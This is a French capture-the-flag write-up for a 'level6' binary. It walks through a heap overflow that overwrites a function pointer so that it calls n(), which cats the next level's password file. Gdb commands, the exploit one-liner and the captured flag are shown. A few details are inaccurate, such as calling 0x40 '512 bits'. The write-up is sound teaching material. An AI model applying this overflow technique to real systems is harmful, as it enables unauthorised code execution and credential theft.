Je commence par decompiler le binaire level6 sur ghidra et je decouvre 2 fonctions en plus de main:

	-n()
	-m()

Dans le main on aloue 1 chaine de caractere et 1 pointeur sur fonction avec malloc puis on assige la fontion m() au pointeur sur fonction.
Ensuite on copie argv[1] dans la chaine alouee avec strcpy.
Puis le ppointeur sur fonction appelle la fonction sur laquelle il pointe.

La fonction m() ecrit "Nope" sur STDIN avec puts() puis retourne.
La fonction n() execute la commande suivante avec system():

	-"/bin/cat /home/user/level7/.pass"

Je comprend alors qu'il faut que je modifie l'adresse stockee dans le pointeur sur fonction pour y ecrire l'adresse de la fonciton n().


Je commence par lancer gdb (que j'ai upgrade avec le plugin gef pour me permettre d'utiliser la commande heap chunks)

$>gdb level6

Je desassemble la fonction main pour obtenir l'adresse de l'instruction qui suit l'appel a strcpy et y poser un break point.

(gef)disas main
(gef)b *080484ca

Ensiute je veux inspecter le comportement de la heap en fonction de la chaine de caractere que je donne en input a mon binaire.
Je vois dans ghidra que le buffer est alloue de 0x40 c'est a dire 512bits

512 / 8 = 64 donc la taille du buffer est de 64 octets.

J'essai d'input 64 'A' puis des groupes de 4 lettres differentes pour trouver a partir de quelle taille je peux depasser sur le deuxieme buffer alloue.

(gef)r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH
(gef)heap chunks

La commande heap chunks me permet d'affichier les chunks de la heap et donc les deux buffers, je vois que le deuxieme buffer (celui du pointeur sur fonction) contient "DDDDEEEEFFFFGGGG".

Le nombre de caracteres qu'il me faut donc pour depasser sur ce buffer est egale a 64 + 4 + 4 = 72 caracteres.

Ce que je veux maintenant c'est ecrire l'adresse de la fonction n() dans ce deuxieme buffer.

Je recupere l'adresse de n():

(gef)info functions
All defined functions:

Non-debugging symbols:
0x080482f4  _init
0x08048340  strcpy@plt
0x08048350  malloc@plt
0x08048360  puts@plt
0x08048370  system@plt
0x08048380  __gmon_start__@plt
0x08048390  __libc_start_main@plt
0x080483a0  _start
0x080483d0  __do_global_dtors_aux
0x08048430  frame_dummy
0x08048454  n
0x08048468  m
0x0804847c  main
0x080484e0  __libc_csu_init
0x08048550  __libc_csu_fini
0x08048552  __i686.get_pc_thunk.bx
0x08048560  __do_global_ctors_aux
0x0804858c  _fini

=> l'adresse de n() est 0x08048454

Pour l'ecrire dans le buffer je dois d'abord la transformer en little endian et separer les bits par de \x

0x08048454 devient \x54\x84\x04\x08

je dois donc ajouter cette adresse formatee apres mes 72 caracteres et le passer en premier argument du binaire pour l'ecrire dans le buffer du pointeur sur fonction.

$>./level6 $(ruby -e 'puts "A"*72 + "\x54\x84\x04\x08"')
$>f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
